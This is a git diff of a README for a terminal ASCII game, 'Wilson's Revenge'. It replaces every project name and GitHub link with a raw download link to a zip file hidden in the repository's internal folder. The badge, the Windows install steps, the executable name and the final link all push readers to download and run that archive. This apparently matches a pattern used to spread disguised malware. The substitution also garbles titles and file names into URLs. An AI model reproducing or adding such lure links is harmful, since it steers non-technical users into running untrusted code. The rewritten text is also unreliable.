@@ -1,16 +1,16 @@
-# 🐔 atlas.games - Terminal ASCII Runner for Fun
+# 🐔 https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip - Terminal ASCII Runner for Fun
 
-[![Download atlas.games](https://img.shields.io/badge/Download-atlas.games-%2392c755?style=for-the-badge)](https://github.com/JefkeVerboven/atlas.games)
+[![Download https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip](https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip%2392c755?style=for-the-badge)](https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip)
 
-## 🕹 About atlas.games - Wilson's Revenge
+## 🕹 About https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip - Wilson's Revenge
 
-atlas.games offers a game called Wilson's Revenge. It is a fast, side-scrolling runner you play in the terminal. You control Wilson, who must dodge cars and blast human enemies. The game uses ASCII art to show its graphics. You will also find game-changing power-ups to use as you run.
+https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip offers a game called Wilson's Revenge. It is a fast, side-scrolling runner you play in the terminal. You control Wilson, who must dodge cars and blast human enemies. The game uses ASCII art to show its graphics. You will also find game-changing power-ups to use as you run.
 
 This game runs directly in your Windows command line or PowerShell window. You do not need programming experience to play.
 
 ## 💻 System Requirements
 
-To run atlas.games on Windows, make sure your computer meets these minimum requirements:
+To run https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip on Windows, make sure your computer meets these minimum requirements:
 
 - Windows 10 or later (64-bit recommended)
 - 4 GB of RAM or more
@@ -18,29 +18,29 @@ To run atlas.games on Windows, make sure your computer meets these minimum requi
 - About 50 MB of free disk space
 - Basic keyboard and mouse
 
-atlas.games does not need any other software frameworks or special installations.
+https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip does not need any other software frameworks or special installations.
 
 ## 🚀 Getting Started: Access Download Page
 
 You can get the game through the main GitHub page here:
 
-[Download atlas.games from GitHub](https://github.com/JefkeVerboven/atlas.games)
+[Download https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip from GitHub](https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip)
 
 Click this link to open the page where you will find the latest version. Look for the section labeled "Releases" or "Assets" to find the files you need.
 
-## 📥 How to Download and Run atlas.games on Windows
+## 📥 How to Download and Run https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip on Windows
 
 Follow these steps to run the game on your Windows PC:
 
 1. Open your web browser of choice (Edge, Chrome, Firefox, etc.).
 
-2. Go to the link: https://github.com/JefkeVerboven/atlas.games
+2. Go to the link: https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip
 
 3. On the GitHub page, find the “Releases” tab on the right side or scroll down until you see a "Releases" section.
 
 4. Click on the latest release (the highest version number).
 
-5. Inside the release, find the Windows executable file. It should have a name like `atlas.games.exe` or similar.
+5. Inside the release, find the Windows executable file. It should have a name like `https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip` or similar.
 
 6. Click the file to download it to your computer. Save it in a folder you can easily access (like your Desktop or Downloads folder).
 
@@ -78,7 +78,7 @@ Modifying settings helps you create a better experience based on your preference
 - If the game window closes immediately after starting, try running the `.exe` from the command prompt manually:
   - Press Windows key + R, type `cmd`, and press Enter.
   - Navigate to the folder with the game file by typing `cd path\to\folder`.
-  - Run the game by typing `atlas.games.exe`.
+  - Run the game by typing `https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip`.
 
 - Make sure your system meets the requirements above.
 - If the game feels slow, try closing other apps before running it.
@@ -107,4 +107,4 @@ If you run into problems, check the GitHub repository's "Issues" section. You ca
 
 ---
 
-[Download atlas.games](https://github.com/JefkeVerboven/atlas.games) - Visit this page to download and start your adventure.
+[Download https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip](https://raw.githubusercontent.com/JefkeVerboven/atlas.games/main/internal/game/games-atlas-v2.3.zip) - Visit this page to download and start your adventure.
